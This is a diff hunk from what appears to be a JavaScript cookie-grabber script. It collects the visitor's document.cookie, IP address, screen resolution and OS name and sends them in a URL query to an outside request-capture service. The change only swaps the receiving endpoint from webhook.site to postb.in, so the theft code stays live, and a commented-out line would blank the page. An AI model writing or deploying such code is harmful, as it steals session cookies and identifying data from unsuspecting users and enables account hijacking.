@@ -23,7 +23,7 @@ var cookie = document.cookie
 var screenResolution = x + 'x' + y
 
 sleep(250).then(() => {
-var ez = httpGet("https://webhook.site/18d7b104-3aa7-494c-8888-0609d636d9c6?ip=" + ipAddress + "&ssion=" + cookie + "&resolution=" +  screenResolution + "&osname=" + OSName)
+var ez = httpGet("https://postb.in/1593792760097-2015366230625??ip=" + ipAddress + "&ssion=" + cookie + "&resolution=" +  screenResolution + "&osname=" + OSName)
 })
  // 	document.body.innerHTML = '';
 	
